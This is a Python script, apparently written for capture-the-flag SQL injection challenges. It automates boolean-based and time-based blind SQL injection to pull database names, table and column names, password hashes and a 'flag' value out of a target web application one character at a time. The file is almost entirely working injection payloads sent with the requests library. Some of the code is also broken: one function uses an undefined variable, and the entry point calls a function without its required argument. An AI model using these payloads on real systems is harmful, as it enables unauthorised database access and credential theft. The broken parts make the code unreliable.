# -*- coding:utf-8 -*-

import requests
import sys
import time

def buer(urlOPEN):
    session = requests.Session()
    flag = ''
    for i in range(1, 250):
        left = 32
        right = 128
        mid = (left + right) // 2
        while (left < right):
            payload = "admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))>%s))^'1" % (i, mid)
            data = {'uname': payload, 'passwd': 'admin'}
            res = requests.post(url, data=data)
            if 'password' in res.text:
                left = mid + 1
            else:
                right = mid
            mid = (left + right) // 2
        if mid == 32 or mid == 127:
            break
        flag = flag + chr(mid)
        print(flag)

starOperatorTime = []
mark = '填返回数据包内的标志'

def database_name(urlOPEN):
    name = ''
    for j in range(1, 9):
        for i in 'sqcwertyuioplkjhgfdazxvbnm':
            url = urlOPEN + 'if(substr(database(),%d,1)="%s",1,1)%%23' % (j, i)
            # print(url+'%23')
            r = requests.get(url)
            if mark in r.text:
                name = name + i

                print(name)

                break
    print('database_name:', name)


def table_name(urlOPEN):
    list = []
    for k in range(0, 4):
        name = ''
        for j in range(1, 9):
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url = urlOPEN + 'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,1)%%23' % (k, j, i)
                # print(url+'%23')
                r = requests.get(url)
                if mark in r.text:
                    name = name + i
                    break
        list.append(name)
    print('table_name:', list)


# start = time.time()


# stop = time.time()
# starOperatorTime.append(stop-start)
# print("所用的平均时间： " + str(sum(starOperatorTime)/100))

def column_name(urlOPEN):
    list = []
    for k in range(0, 3):  # 判断表里最多有4个字段
        name = ''
        for j in range(1, 9):  # 判断一个 字段名最多有9个字符组成
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url = urlOPEN + 'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,1)%%23' % (k, j, i)
                r = requests.get(url)
                if mark in r.text:
                    name = name + i
                    break
        list.append(name)
    print('column_name:', list)


def get_data(urlOPEN):
    name = ''
    for j in range(1, 50):  # 判断一个值最多有51个字符组成
        for i in range(48, 126):
            url = urlOPEN + 'if(ascii(substr((select flag from flag),%d,1))=%d,1,1)%%23' % (j, i)
            r = requests.get(url)
            if mark in r.text:
                name = name + chr(i)
                print(name)
                break
    print('value:', name)





def timeinject(uurl):
    session = requests.session()
    name = ""
    for k in range(1, 10):
        for i in range(1, 10):
            print(i)
            for j in range(31, 128):
                j = (128 + 31) - j
                str_ascii = chr(j)
                # 数据库名
                payload = "%%20and%%20if(substr(database(),%s,1)='%s',sleep(5),1)--+" % (str(i), str(str_ascii))
                url = uurl + payload
                print(url)
                start_time = time.time()  # time.time() 返回当前时间戳
                str_get = session.get(url)
                end_time = time.time()
                t = end_time - start_time
                if t > 1:
                    if str_ascii == "+":
                        sys.exit()
                    else:
                        name += str_ascii
                        break
    print(name)

def gettimeinject(url):
    session = requests.session()
    name = ""
    for i in range(1, 50):
        print(i)
        for j in range(31, 128):
            j = (128 + 31) - j
            str_ascii = chr(j)
            payolad = "if(substr((select flag from sqli.flag),%d,1) = '%s',sleep(1),1)" % (i, str_ascii)
            start_time = time.time()
            str_get = session.get(url=url + payolad)  # requests库的session对象能够帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持cookies。
            end_time = time.time()
            t = end_time - start_time
            if t > 1:
                if str_ascii == "+":
                    sys.exit()
                else:
                    name += str_ascii
                    break
        print(name)

if __name__ == '__main__':
    gettimeinject()